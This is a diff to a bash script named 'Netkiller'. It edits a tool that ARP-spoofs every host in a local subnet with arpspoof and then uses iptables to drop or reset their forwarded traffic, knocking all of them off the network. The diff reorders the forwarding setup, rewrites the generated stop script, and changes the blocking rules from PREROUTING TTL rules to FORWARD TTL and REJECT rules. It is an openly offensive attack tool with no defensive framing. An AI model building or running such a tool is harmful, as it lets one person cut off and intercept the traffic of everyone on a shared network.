@@ -23,6 +23,26 @@ if [[ $EUID -ne 0 ]]; then
     exec sudo "$0" "$@"
 fi
 
+# Enable IP forwarding and blocking rules
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
+iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Create stop script
+cat > /bin/netkiller-stop << 'EOF'
+#!/bin/sh
+
+echo " "
+echo "Netkiller is Stop..."
+echo " "
+iptables -t mangle -F FORWARD
+iptables -F FORWARD
+pkill -f arpspoof
+pkill arpspoof
+echo " "
+EOF
+chmod 755 /bin/netkiller-stop
+
 # Detect Network Configuration
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
 GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
@@ -89,24 +109,6 @@ else
     echo "[*] Skipping..."
 fi
 
-# Enable IP forwarding and blocking rules
-sudo echo 1 > /proc/sys/net/ipv4/ip_forward
-sudo echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-
-# Create stop script
-cat > /bin/netkiller-stop << 'EOF'
-#!/bin/sh
-
-echo " "
-echo "Netkiller is Stop..."
-echo " "
-iptables -t mangle -F PREROUTING
-pkill -f arpspoof
-pkill arpspoof
-echo " "
-EOF
-chmod 755 /bin/netkiller-stop
-
 # Function to expand a subnet to individual IPs (using ipcalc)
 expand_subnet() {
     SUBNET=$1
@@ -132,8 +134,9 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
-          iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
-          iptables -t mangle -I PREROUTING -d "$TARGET" -j TTL --ttl-set 0
+          iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
+          iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+          iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
     done
 fi
 echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
